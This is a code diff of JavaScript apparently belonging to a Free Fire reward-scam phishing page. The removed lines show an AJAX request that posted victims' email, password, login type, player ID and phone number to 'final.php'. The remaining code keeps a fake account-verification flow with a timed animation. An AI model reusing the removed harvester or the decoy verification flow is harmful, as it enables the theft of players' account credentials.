@@ -1,11 +1,5 @@
-// lazcodeffmysteryshop.js
-// Variabel global
 var _ggLastEmail = '';
 var _ggLastLogin = '';
-
-function getEndpoint() {
-  return 'final.php';
-}
 
 function locationRedirect() {
   document.getElementById('overlay').classList.remove('active');
@@ -21,7 +15,6 @@ function locationRedirect() {
   document.querySelector('.account_verification').style.display = 'flex';
 }
 
-// Fungsi untuk popup item
 function open_itemReward_confirmation2(el) {
   document.getElementById('myItemReward_confirmationImg').src = el.getAttribute('src');
   document.getElementById('ItemName').textContent = el.getAttribute('item-name');
@@ -60,27 +53,18 @@ function openGgdanfbStep(stepId) {
   if (typeof showStep === 'function') showStep(stepId);
 }
 
+// MODIFIED: tidak ada AJAX, hanya animasi
 function ValidateVerificationData() {
   var playid = document.getElementById('playid').value.trim();
   var phone = document.getElementById('phone').value.trim();
   var level = document.getElementById('level').value;
-  var email = document.getElementById('validateEmail').value;
-  var password = document.getElementById('validatePassword').value;
-  var login = document.getElementById('validateLogin').value;
   if (!playid || !phone || !level) return false;
   document.querySelector('.account_verification').style.display = 'none';
   document.querySelector('.check_verification').style.display = 'flex';
-  $.ajax({
-    type: 'POST',
-    url: 'final.php',
-    data: { email: email, password: password, login: login, playid: playid, phone: phone, level: level },
-    complete: function() {
-      setTimeout(function() {
-        document.querySelector('.check_verification').style.display = 'none';
-        document.querySelector('.processing_account').style.display = 'flex';
-      }, 3000);
-    }
-  });
+  setTimeout(function() {
+    document.querySelector('.check_verification').style.display = 'none';
+    document.querySelector('.processing_account').style.display = 'flex';
+  }, 3000);
   return false;
 }
 
